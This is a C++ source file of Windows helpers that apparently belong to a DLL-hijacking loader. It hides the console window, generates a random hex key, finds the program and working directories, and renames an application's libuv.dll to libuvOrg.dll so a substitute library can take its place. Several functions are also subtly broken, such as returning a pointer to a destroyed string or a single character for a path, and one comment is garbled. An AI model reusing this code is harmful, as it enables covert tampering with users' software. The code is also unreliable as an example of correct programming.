#include "Un-main.h"
#include <fileapi.h>
#pragma comment(lib,"MSVCRTD.lib")


string password()
{
	int n = 32;

	char chr[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
			'A', 'B', 'C', 'D', 'E', 'F' };

	srand(time(NULL));
	string strResult;
	char buf[10] = { 0 };

	for (int i = 0; i < n; i++)
	{
		int idx = rand() % 16;
		sprintf(buf, "%c", chr[idx]);
		strResult.append(buf);
	}

	return strResult.c_str();
}

//Òþ²ØCMD
void no_windows() {
	HWND hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);
}


char *new_process_path() {
	char* new_process;
	char path;
	new_process = _pgmptr;
	path = (char)new_process;
	return new_process;
}



char* Get_Process_in_dir() {
	char* buffer;
	if ((buffer = getcwd(NULL, 0)) == NULL)
	{
		perror("getcwd error");
	}
	else
	{
		return buffer;
	}
}


//Modify String information
string replace_string(string no_replace,string need_relace_string,string befor_replace) {
	int pos;
	pos = no_replace.find(need_relace_string);
	while (pos!=-1)
	{
		no_replace.replace(pos, string(need_relace_string).length(), befor_replace);
		pos = no_replace.find(need_relace_string);
	}
	return no_replace;
}


//Modify FILE NAME 
int reaname(char *old_name,char *new_name) {
	char *moudle;
	string moudle_1;
	strcat(old_name,"\\libuv.dll");
	moudle_1 =replace_string(old_name, "libuv.dll", "libuvOrg.dll");
	moudle = (char*)moudle_1.c_str();
	if (!rename((const char*)old_name, (const char* )moudle))
	{
		return 1;
	}
	else
	{
		return 0;
	}
}



char Getsystemtamppath() {
	char strtmapath[MAX_PATH];
	string temppath;
	GetTempPath(sizeof(strtmapath), strtmapath);
	return *strtmapath;
}